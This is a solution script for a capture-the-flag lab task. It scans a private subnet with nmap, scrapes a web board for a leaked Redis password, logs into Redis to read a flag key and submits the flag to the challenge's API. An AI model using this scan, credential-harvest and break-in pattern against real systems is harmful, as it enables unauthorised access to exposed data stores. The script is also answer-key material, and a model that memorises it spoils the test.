#!/bin/sh
set -eu
python3 - <<'PY'
import html.parser
import json
import re
import socket
import subprocess
import urllib.request
import xml.etree.ElementTree as ET

scan = subprocess.run(
    ["nmap", "-n", "-Pn", "-p", "6379,8080", "--open", "-oX", "-", "172.20.0.0/24"],
    check=True, capture_output=True, text=True,
)
root = ET.fromstring(scan.stdout)
web_hosts, redis_hosts = [], []
for host in root.findall("host"):
    addr = host.find("address[@addrtype='ipv4']")
    if addr is None:
        continue
    ip = addr.attrib["addr"]
    for port in host.findall(".//port"):
        state = port.find("state")
        if state is None or state.attrib.get("state") != "open":
            continue
        if port.attrib.get("portid") == "8080":
            web_hosts.append(ip)
        elif port.attrib.get("portid") == "6379":
            redis_hosts.append(ip)

class Links(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []
    def handle_starttag(self, tag, attrs):
        if tag == "a":
            href = dict(attrs).get("href")
            if href:
                self.hrefs.append(href)

def get_text(url):
    with urllib.request.urlopen(url, timeout=4) as response:
        return response.read().decode("utf-8", "replace")

password = None
for ip in web_hosts:
    base = f"http://{ip}:8080/"
    parser = Links()
    parser.feed(get_text(base))
    for href in parser.hrefs:
        if href.startswith("/") or "://" in href:
            continue
        try:
            match = re.search(r"redis_password=([^\s<]+)", get_text(base + href))
        except Exception:
            continue
        if match:
            password = match.group(1)
            break
    if password:
        break
if not password or not redis_hosts:
    raise SystemExit("Could not identify the reachable board and protected store")

def read_resp(sock):
    def line():
        data = bytearray()
        while not data.endswith(b"\r\n"):
            chunk = sock.recv(1)
            if not chunk:
                raise RuntimeError("Redis closed the connection")
            data.extend(chunk)
        return bytes(data[:-2])

    prefix = sock.recv(1)
    if not prefix:
        raise RuntimeError("Redis closed the connection")
    if prefix == b"+":
        return line().decode()
    if prefix == b"-":
        raise RuntimeError(line().decode())
    if prefix == b":":
        return int(line())
    if prefix == b"$":
        size = int(line())
        if size < 0:
            return None
        value = bytearray()
        while len(value) < size + 2:
            chunk = sock.recv(size + 2 - len(value))
            if not chunk:
                raise RuntimeError("Redis closed during bulk response")
            value.extend(chunk)
        return bytes(value[:size]).decode()
    raise RuntimeError("Unexpected Redis response")

def command(sock, *parts):
    encoded = [f"*{len(parts)}\r\n".encode()]
    for part in parts:
        raw = str(part).encode()
        encoded.extend((f"${len(raw)}\r\n".encode(), raw, b"\r\n"))
    sock.sendall(b"".join(encoded))
    return read_resp(sock)

flag = None
for ip in redis_hosts:
    try:
        with socket.create_connection((ip, 6379), timeout=4) as sock:
            sock.settimeout(4)
            if command(sock, "AUTH", password) != "OK":
                continue
            result = command(sock, "GET", "actuator:flag")
            if isinstance(result, str) and result:
                flag = result
                break
    except (OSError, RuntimeError):
        continue
if not flag:
    raise SystemExit("Could not authenticate to the protected store or read its record")

payload = json.dumps({"challenge_id": "scl-challenge-frame-81f815", "task_id": "task1", "flag": flag})
submitted = subprocess.run(
    ["curl", "-s", "http://172.20.0.3/api/challenges/submit", "-X", "POST",
     "-H", "Content-Type: application/json", "--data-binary", payload],
    check=True, capture_output=True, text=True,
)
print(submitted.stdout)
PY
